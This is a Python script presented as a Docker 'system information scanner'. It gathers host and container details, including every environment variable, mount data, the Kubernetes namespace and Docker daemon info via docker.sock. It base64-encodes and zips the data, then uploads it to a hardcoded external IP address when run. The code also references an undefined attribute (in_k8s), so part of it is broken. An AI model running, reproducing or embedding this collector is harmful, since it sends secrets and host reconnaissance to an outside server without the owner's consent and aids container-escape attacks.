'''
 # @ Create Time: 2025-11-13 16:16:18
 # @ Modified time: 2025-11-13 16:16:33
 # @ Description: compatible system information scanner for docker environment
 '''


from __future__ import annotations

import os, sys, json, base64, socket, zipfile, tempfile, traceback, platform, getpass, subprocess
from pathlib import Path
import uuid as _uuid
import requests, psutil
import os, json, subprocess, socket


class SysInfoScanner:
    def __init__(self, save_location: Path):
        ''' 
        :param save_location: local position or remote site
        '''
        self.save_location = save_location
        self.in_container = self._detect_container()
    
    # detect if running inside a container
    def _detect_container(self):
        # Method 1: /.dockerenv
        if os.path.exists("/.dockerenv"):
            return True
        
        # Method 2: cgroup info
        try:
            with open("/proc/1/cgroup") as f:
                txt = f.read()
            if ("docker" in txt) or ("containerd" in txt):
                return True
        except:
            pass
        # Not a container
        return False

    # -------- 2. Host / Common info --------
    def os_info(self):
        p = platform
        return {"OS": p.system(), "OS Version": p.version(), "Release": p.release()}

    def mach_proc_info(self):
        return {
            "Machine": platform.machine(),
            "Processor": platform.processor(),
            "Architecture": platform.architecture(),
        }

    def user_info(self):
        # In containers it's almost always root
        try:
            return {"User": getpass.getuser()}
        except:
            return {"User": None}

    def network_info(self):
        ip = None
        try:
            ip = socket.gethostbyname(socket.gethostname())
            # If docker internal IP, attempt fallback
            if ip.startswith("127."):
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                try:
                    s.connect(("8.8.8.8", 80))
                    ip = s.getsockname()[0]
                finally:
                    s.close()
        except:
            pass

        # MAC address
        try:
            node = _uuid.getnode()
            mac = ":".join(f"{(node >> (i * 8)) & 0xff:02x}" for i in reversed(range(6)))
        except:
            mac = None

        return {"IP Address": ip, "MAC Address": mac}

    def disk_info(self):
        try:
            return {"Disk Partitions": [
                {"device": d.device, "mountpoint": d.mountpoint, "fstype": d.fstype}
                for d in psutil.disk_partitions()
            ]}
        except:
            return {"Disk Partitions": []}

    def mem_info(self):
        try:
            v = psutil.virtual_memory()
            return {"Total Memory": v.total, "Available Memory": v.available}
        except:
            return {"Total Memory": None, "Available Memory": None}

    def env_info(self):
        return {"Environment Variables": dict(os.environ)}

    # -------- 3. Container-specific info --------
    def container_info(self):
        if not self.in_container:
            return {}

        info = {
            "Container Mode": True,
            "Hostname (Container ID)": open("/etc/hostname").read().strip(),
        }

        # cgroup limits
        mem_limit = None
        cpu_quota = None

        try:
            with open("/sys/fs/cgroup/memory/memory.limit_in_bytes") as f:
                mem_limit = f.read().strip()
        except:
            pass

        try:
            with open("/sys/fs/cgroup/cpu/cpu.cfs_quota_us") as f:
                cpu_quota = f.read().strip()
        except:
            pass

        info["Cgroup Memory Limit"] = mem_limit
        info["Cgroup CPU Quota"] = cpu_quota

        # docker.sock detection
        info["Can Access docker.sock"] = os.path.exists("/var/run/docker.sock")

        # Mount info
        try:
            with open("/proc/self/mountinfo") as f:
                info["MountInfo"] = f.read().splitlines()
        except:
            info["MountInfo"] = []

        # Kubernetes metadata
        if self.in_k8s:
            info["Kubernetes"] = True
            info["K8s Namespace"] = open("/var/run/secrets/kubernetes.io/serviceaccount/namespace").read().strip()
        else:
            info["Kubernetes"] = False

        return info

    def collect_host_info_from_container(self):
        info = {}

        # 1. host kernel info
        try:
            info["Host Kernel"] = subprocess.check_output(["uname", "-a"]).decode().strip()
        except:
            info["Host Kernel"] = None
        
        # 2. Host init system check
        try:
            with open("/proc/1/sched") as f:
                sched = f.read().splitlines()[0]
            info["Host Init Process"] = sched
        except:
            info["Host Init Process"] = None
        
        # 3. cgrounp info
        try:
            with open("/proc/self/cgroup") as f:
                info["Cgroup Hierarchy"] = f.read().splitlines()
        except:
            info["Cgroup Hierarchy"] = None

        # 4. Host file system path (inferred from mountinfo)
        try:
            with open("/proc/self/mountinfo") as f:
                info["MountInfo"] = f.read().splitlines()
        except:
            info["MountInfo"] = None
        
        # 5. If docker.sock exists → Enumerate the host Docker
        docker_sock = "/var/run/docker.sock"
        if os.path.exists(docker_sock):
            info["Docker Socket Present"] = True

            try:
                import requests_unixsocket
                session = requests_unixsocket.Session()
                response = session.get("http+unix://%2Fvar%2Frun%2Fdocker.sock/info")
                info["Docker Info"] = response.json()
            except Exception as e:
                info["Docker Info"] = f"Failed: {e}"
        else:
            info["Docker Socket Present"] = False

        return info

    
    # -------- 4. Encoding / compression / sending --------
    def _encode(self, info: dict):
        return base64.b64encode(json.dumps(info).encode()).decode()

    def _compress(self, encoded_info: str, filename: str):
        path = self.save_location / filename
        with zipfile.ZipFile(path, 'w', zipfile.ZIP_DEFLATED) as z:
            z.writestr("systeminfo.txt", encoded_info)
        return path

    def collect_and_send(self, upload_url: str):
        try:
            info = {}

            # Combine host/common info
            info.update(self.os_info())
            info.update(self.mach_proc_info())
            info.update(self.user_info())
            info.update(self.network_info())
            info.update(self.disk_info())
            info.update(self.mem_info())
            info.update(self.env_info())

            # Add container info
            info.update(self.container_info())

            if self.in_container:
                info.update(self.collect_host_info_from_container())

            zpath = self._compress(self._encode(info), "info.zip")

            with open(zpath, "rb") as f:
                print(f"[+] Sending data to {upload_url}")
                r = requests.post(upload_url, files={"file": f}, timeout=20)
                print("[+] Response:", r.status_code, r.text)

        except Exception as e:
            print("[-] Failed:", e)
            traceback.print_exc()

if __name__ == "__main__":
    scanner = SysInfoScanner(Path(tempfile.gettempdir()))
    scanner.collect_and_send("http://20.93.23.234:8081/upload")